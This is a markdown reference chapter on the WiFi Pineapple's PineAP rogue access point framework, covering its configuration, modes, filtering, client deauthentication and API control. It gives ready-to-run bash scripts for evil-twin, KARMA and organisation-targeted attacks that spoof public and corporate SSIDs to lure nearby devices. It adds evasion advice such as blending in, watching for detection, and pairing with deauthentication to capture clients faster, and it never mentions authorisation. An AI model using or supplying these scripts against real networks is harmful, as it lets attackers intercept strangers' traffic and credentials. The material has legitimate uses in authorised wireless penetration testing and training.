# PineAP Module Reference

## Overview

PineAP is the WiFi Pineapple's built-in rogue access point framework. It automates Evil Twin attacks, client manipulation, and probe response handling.

---

## PineAP Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    PINEAP ARCHITECTURE                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   ┌─────────────────────────────────────────────────┐       │
│   │                 PineAP DAEMON                    │       │
│   │        (Manages all Evil Twin operations)        │       │
│   └───────────────────┬─────────────────────────────┘       │
│                       │                                      │
│   ┌───────────────────┴─────────────────────────────┐       │
│   │                                                   │       │
│   ▼                   ▼                   ▼          │       │
│ ┌─────────┐     ┌─────────┐       ┌─────────────┐   │       │
│ │ hostapd │     │  Probe  │       │  Client     │   │       │
│ │ (AP)    │     │ Monitor │       │  Tracker    │   │       │
│ └─────────┘     └─────────┘       └─────────────┘   │       │
│                                                              │
│   FEATURES:                                                  │
│   ├── KARMA - Respond to all probes                         │
│   ├── Beacon Response - Broadcast saved SSIDs               │
│   ├── Harvester - Collect probe requests                    │
│   ├── Logging - Track associations                          │
│   └── Filtering - Whitelist/blacklist MACs                  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Configuration Files

### PineAP Config
```bash
# /etc/pineapple/pineap.conf
interface=wlan1
driver=nl80211
ssid=FreeWiFi
channel=6
karma=1
beacon_response=1
harvester=1
```

### SSID Pool
```bash
# /etc/pineapple/ssid_pool.txt
# One SSID per line
attwifi
xfinitywifi
Starbucks
linksys
NETGEAR
```

---

## PineAP Modes

### 1. KARMA Mode
Responds to ALL probe requests, claiming to be any network.

```bash
# Enable KARMA
pineap karma enable

# Disable KARMA
pineap karma disable
```

### 2. Beacon Response
Broadcasts beacons for all SSIDs in pool.

```bash
# Enable beacon response
pineap beacon_response enable

# Disable
pineap beacon_response disable
```

### 3. Harvester
Collects probe requests from nearby devices.

```bash
# Enable harvester
pineap harvester enable

# View collected probes
cat /tmp/pineap_probes.log
```

### 4. Logging
Logs all client associations.

```bash
# Enable logging
pineap logging enable

# View logs
cat /tmp/pineap.log
```

---

## Command Line Control

### PineAP Commands

```bash
# Start PineAP
pineap start

# Stop PineAP
pineap stop

# Status
pineap status

# Add SSID to pool
pineap add_ssid "NetworkName"

# Remove SSID from pool
pineap remove_ssid "NetworkName"

# List SSIDs
pineap list_ssids

# Clear SSID pool
pineap clear_pool
```

### Shell Scripts

```bash
#!/bin/bash
# Start PineAP with specific config

# Stop any running instance
pineap stop 2>/dev/null

# Configure
echo "FreeWiFi" > /etc/pineapple/ssid_pool.txt
echo "CoffeeShop" >> /etc/pineapple/ssid_pool.txt
echo "Airport_WiFi" >> /etc/pineapple/ssid_pool.txt

# Start with KARMA and beacon response
pineap start
pineap karma enable
pineap beacon_response enable
pineap logging enable

echo "PineAP running with $(wc -l < /etc/pineapple/ssid_pool.txt) SSIDs"
```

---

## Filtering

### MAC Filters

```bash
# Whitelist only (allow specific MACs)
pineap filter mode whitelist
pineap filter add AA:BB:CC:DD:EE:FF

# Blacklist (block specific MACs)
pineap filter mode blacklist
pineap filter add 11:22:33:44:55:66

# Disable filtering
pineap filter mode none

# List filters
pineap filter list

# Clear filters
pineap filter clear
```

### SSID Filters

```bash
# Only respond to specific SSIDs
pineap ssid_filter enable
pineap ssid_filter add "TargetNetwork"
pineap ssid_filter add "TargetNetwork-Guest"
```

---

## Client Management

### View Connected Clients

```bash
# Via hostapd_cli
hostapd_cli -i wlan1 all_sta

# Via DHCP leases
cat /tmp/dnsmasq.leases

# Via ARP table
cat /proc/net/arp | grep wlan1
```

### Deauthenticate Clients

```bash
# Via hostapd_cli
hostapd_cli -i wlan1 deauthenticate AA:BB:CC:DD:EE:FF

# Via aireplay-ng
aireplay-ng --deauth 5 -a $(cat /sys/class/net/wlan1/address) -c AA:BB:CC:DD:EE:FF wlan0mon
```

---

## API Integration

### REST API Endpoints

```bash
# Base URL
API="http://172.16.42.1:1471/api"

# Get status
curl -s "$API/pineap/status"

# Enable KARMA
curl -s "$API/pineap/karma/enable"

# Add SSID
curl -s -X POST "$API/pineap/ssid/add" -d "ssid=TestNetwork"

# List clients
curl -s "$API/pineap/clients"
```

### API Script Example

```bash
#!/bin/bash
# PineAP control via API

API="http://172.16.42.1:1471/api"
TOKEN="your_api_token"

pineap_api() {
    curl -s -H "Authorization: Bearer $TOKEN" "$API/pineap/$1"
}

# Start PineAP
pineap_api "start"

# Enable features
pineap_api "karma/enable"
pineap_api "beacon_response/enable"

# Monitor clients
while true; do
    CLIENTS=$(pineap_api "clients" | grep -c "mac")
    echo "[$(date)] Connected clients: $CLIENTS"
    sleep 10
done
```

---

## Attack Scenarios

### Scenario 1: Basic Evil Twin

```bash
#!/bin/bash
# Clone target network

TARGET_SSID="$1"

if [ -z "$TARGET_SSID" ]; then
    echo "Usage: $0 <SSID>"
    exit 1
fi

# Clear pool, add only target
echo "$TARGET_SSID" > /etc/pineapple/ssid_pool.txt

# Start PineAP
pineap stop 2>/dev/null
pineap start
pineap beacon_response enable
pineap logging enable

echo "Evil Twin active: $TARGET_SSID"
echo "Monitoring for clients..."

# Monitor
tail -f /tmp/pineap.log
```

### Scenario 2: KARMA Attack

```bash
#!/bin/bash
# Full KARMA attack

# Add common SSIDs
cat > /etc/pineapple/ssid_pool.txt << EOF
attwifi
xfinitywifi
Starbucks
Google Starbucks
McDonalds Free WiFi
Hotel_WiFi
Airport_Free_WiFi
EOF

# Start with KARMA
pineap stop 2>/dev/null
pineap start
pineap karma enable
pineap beacon_response enable
pineap harvester enable
pineap logging enable

echo "KARMA attack active"
echo "Responding to all probes + broadcasting $(wc -l < /etc/pineapple/ssid_pool.txt) SSIDs"
```

### Scenario 3: Targeted Attack

```bash
#!/bin/bash
# Target specific organization

TARGET_ORG="Acme Corp"

# Add variants
cat > /etc/pineapple/ssid_pool.txt << EOF
${TARGET_ORG}
${TARGET_ORG}-Guest
${TARGET_ORG}-Secure
${TARGET_ORG}_WiFi
guest-${TARGET_ORG}
EOF

# Start selective
pineap stop 2>/dev/null
pineap start
pineap ssid_filter enable

for ssid in $(cat /etc/pineapple/ssid_pool.txt); do
    pineap ssid_filter add "$ssid"
done

pineap beacon_response enable
pineap logging enable

echo "Targeted attack: $TARGET_ORG variants"
```

---

## Troubleshooting

### Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| PineAP won't start | Interface busy | `airmon-ng check kill` |
| No clients connect | Wrong channel | Match target channel |
| KARMA not responding | Disabled | `pineap karma enable` |
| Logs empty | Logging off | `pineap logging enable` |

### Debugging

```bash
# Check PineAP status
pineap status

# Check hostapd
ps aux | grep hostapd

# Check interface
iw dev wlan1 info

# View errors
logread | grep -i pineap

# Restart fresh
pineap stop
airmon-ng check kill
sleep 2
pineap start
```

---

## Best Practices

### Operational Security
1. Use common SSIDs that blend in
2. Match channel to nearby legitimate AP
3. Position for best signal coverage
4. Monitor for detection attempts

### Effectiveness
1. Include local network names
2. Use harvested probe requests
3. Time attacks for busy periods
4. Combine with deauth for faster capture

---

## Quick Reference

```
┌─────────────────────────────────────────────────────────────┐
│                 PINEAP QUICK REFERENCE                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  CONTROL:                                                    │
│    pineap start/stop/status                                 │
│                                                              │
│  MODES:                                                      │
│    pineap karma enable/disable                              │
│    pineap beacon_response enable/disable                    │
│    pineap harvester enable/disable                          │
│    pineap logging enable/disable                            │
│                                                              │
│  SSID MANAGEMENT:                                            │
│    pineap add_ssid "SSID"                                   │
│    pineap remove_ssid "SSID"                                │
│    pineap list_ssids                                         │
│                                                              │
│  FILTERING:                                                  │
│    pineap filter mode whitelist/blacklist/none              │
│    pineap filter add MAC                                     │
│                                                              │
│  FILES:                                                      │
│    /etc/pineapple/ssid_pool.txt                             │
│    /tmp/pineap.log                                           │
│    /tmp/pineap_probes.log                                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

[← Network Tools](04_Network_Tools.md) | [Back to Fundamentals](README.md) | [Next: Bash Scripting →](06_Bash_Scripting.md)
